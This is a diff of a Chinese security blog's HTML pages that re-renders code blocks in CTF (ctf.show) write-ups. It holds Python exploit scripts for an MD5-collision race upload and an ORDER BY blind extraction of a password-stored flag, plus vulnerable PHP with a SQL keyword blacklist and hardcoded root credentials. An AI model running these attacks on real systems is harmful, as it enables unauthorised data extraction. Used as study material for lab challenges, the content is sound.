<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>解析：</strong></p>
 <p>发现这里是和key.dat文件进行强碰撞（内容不一样，但是两个文件的md5值相同，同时sha1值不相同）
 key.dat文件key直接进行下载
 借助工具：fastcoll_v1.0.0.5.exe生成两个md5值相同的文件。fastcoll_v1.0.0.5.exe
 -p key.dat -o 1.dat 2.dat</p></li>
 <li><p>python上传两个文件</p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
-import time
-import hashlib
-import threading
-
-def post(data):
-	try:
-		r&#x3D;requests.post(url,data&#x3D;data)
-		if &quot;ctfshow&quot; in r.text:
-			print(r.text)
-	except Exception as e:
-		pass
-
-mi&#x3D;str(time.localtime().tm_min)
-m&#x3D;hashlib.md5(mi.encode()).hexdigest()
-url&#x3D;&#39;http:&#x2F;&#x2F;ce61acc9-c947-4ac4-9d2c-3b81b8708df5.challenge.ctf.show:8080&#x2F;check.php?token&#x3D;&#123;&#125;&amp;php:&#x2F;&#x2F;input&#39;.format(m)
-with open(&#39;key.dat&#39;,&#39;rb&#39;) as f:
-    data1&#x3D;f.read()
-with open(&#39;2.dat&#39;,&#39;rb&#39;) as f:
-    data2&#x3D;f.read()
-for i in range(30):
-	threading.Thread(target&#x3D;post,args&#x3D;(data1,)).start()
-for i in range(30):
-	threading.Thread(target&#x3D;post,args&#x3D;(data2,)).start()
-</code></pre></li>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">data</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			<span class="built_in">print</span>(r.text)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">mi=<span class="built_in">str</span>(time.localtime().tm_min)</span><br><span class="line">m=hashlib.md5(mi.encode()).hexdigest()</span><br><span class="line">url=<span class="string">&#x27;http://ce61acc9-c947-4ac4-9d2c-3b81b8708df5.challenge.ctf.show:8080/check.php?token=&#123;&#125;&amp;php://input&#x27;</span>.<span class="built_in">format</span>(m)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1=f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2.dat&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	threading.Thread(target=post,args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	threading.Thread(target=post,args=(data2,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 <li><p>最终失败</p></li>
 </ol></li>
 </ol>
@@ -1418,70 +1160,14 @@ alt="image-20230525014011115" /></p></li>
 <p><strong>login.php</strong>；发现<code>pwd</code>字段<img
 src="https://s2.loli.net/2023/05/25/kJTzrK7ifj9RHUv.png"
 alt="login.php" /></p>
-<pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; user_main.php
-&lt;?php
-	
-	if(isset($_SESSION[&quot;login&quot;]) &amp;&amp; $_SESSION[&quot;login&quot;] &#x3D;&#x3D;&#x3D; true)&#123;
-		$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);
-        if (!$con)
-        &#123;
-            die(&#39;Could not connect: &#39; . mysqli_error());
-        &#125;
-		$order&#x3D;$_GET[&#39;order&#39;];
-		if(isset($order) &amp;&amp; strlen($order)&lt;6)&#123;
-			if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?&#x2F;i&quot;,$order))&#123;
-				die(&quot;error&quot;);
-			&#125;
-			$sql&#x3D;&quot;select * from user order by $order&quot;;
-        &#125;else&#123;
-            $sql&#x3D;&quot;select * from user order by id&quot;;
-        &#125;   
-
-?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user_main.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$order</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$order</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$order</span>)&lt;<span class="number">6</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?/i&quot;</span>,<span class="variable">$order</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select * from user order by <span class="subst">$order</span>&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>解析：</strong></p>
 <p><code>$order=$_GET['order'];</code>：get <code>order</code></p>
 <p><code>$sql="select * from user order by $order";</code>：关键代码</p>
 <p>使
 <code>order = pwd</code>,从题目提示中了解到：flag在指定用户的密码中。</p></li>
 <li><p>Python脚本</p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
-url &#x3D; &quot;http:&#x2F;&#x2F;410bc6b8-0a07-434c-bb4f-c8b9501b06e6.challenge.ctf.show&#x2F;&quot;
-url1 &#x3D; url+&quot;&#x2F;reg.php&quot;  # 注册页面
-url2 &#x3D; url+&quot;&#x2F;login.php&quot;  # 登录界面
-url3 &#x3D; url+&quot;&#x2F;user_main.php?order&#x3D;pwd&quot;  # 查询界面
-k &#x3D; &quot;&quot;
-s &#x3D; &quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;
-for j in range(0, 45):
-    print(&quot;*&quot;)
-    for i in s:
-        # print(i)
-        l &#x3D; &quot;&quot;
-        l &#x3D; k+i
-        l2 &#x3D; k+chr(ord(i)-1)
-        data &#x3D; &#123;&#39;username&#39;: l,
-                &#39;email&#39;: &#39;c&#39;,
-                &#39;nickname&#39;: &#39;c&#39;,
-                &#39;password&#39;: l
-                &#125;
-        data2 &#x3D; &#123;&#39;username&#39;: l,
-                 &#39;password&#39;: l
-                 &#125;
-        if (l &#x3D;&#x3D; &#39;flag&#39;):
-            k &#x3D; &#39;flag&#39;
-            print(k)
-            break
-        session &#x3D; requests.session()
-        r1 &#x3D; session.post(url1, data)
-        r2 &#x3D; session.post(url2, data)
-        r3 &#x3D; session.get(url3)
-        t &#x3D; r3.text
-        print(l)
-        print(t.find(&quot;&lt;td&gt;&quot;+l+&quot;&lt;&#x2F;td&gt;&quot;))
-        print(t.find(&quot;&lt;td&gt;flag@ctf.show&lt;&#x2F;td&gt;&quot;))
-        if (t.find(&quot;&lt;td&gt;&quot;+l+&quot;&lt;&#x2F;td&gt;&quot;) &gt; t.find(&quot;&lt;td&gt;flag@ctf.show&lt;&#x2F;td&gt;&quot;)):	&#x2F;&#x2F; 用index会因查找不到字符串而抛出异常
-            k &#x3D; l2
-            print(k)
-            break</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://410bc6b8-0a07-434c-bb4f-c8b9501b06e6.challenge.ctf.show/&quot;</span></span><br><span class="line">url1 = url+<span class="string">&quot;/reg.php&quot;</span>  <span class="comment"># 注册页面</span></span><br><span class="line">url2 = url+<span class="string">&quot;/login.php&quot;</span>  <span class="comment"># 登录界面</span></span><br><span class="line">url3 = url+<span class="string">&quot;/user_main.php?order=pwd&quot;</span>  <span class="comment"># 查询界面</span></span><br><span class="line">k = <span class="string">&quot;&quot;</span></span><br><span class="line">s = <span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        l = <span class="string">&quot;&quot;</span></span><br><span class="line">        l = k+i</span><br><span class="line">        l2 = k+<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: l,</span><br><span class="line">                <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: l</span><br><span class="line">                &#125;</span><br><span class="line">        data2 = &#123;<span class="string">&#x27;username&#x27;</span>: l,</span><br><span class="line">                 <span class="string">&#x27;password&#x27;</span>: l</span><br><span class="line">                 &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">            k = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r1 = session.post(url1, data)</span><br><span class="line">        r2 = session.post(url2, data)</span><br><span class="line">        r3 = session.get(url3)</span><br><span class="line">        t = r3.text</span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        <span class="built_in">print</span>(t.find(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(t.find(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> (t.find(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>) &gt; t.find(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):	// 用index会因查找不到字符串而抛出异常</span><br><span class="line">            k = l2</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p><strong>解析：</strong></p>
 <ol type="1">
 <li><p>针对flag的格式，flag中每一个字符的比对都遵循一个原则</p>
@@ -2217,7 +1903,7 @@ alt="image-20230528013334515" /></p></li>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">238.7k</span>&nbsp;字
+                class="white-color">235.6k</span>&nbsp;字
             
             
             
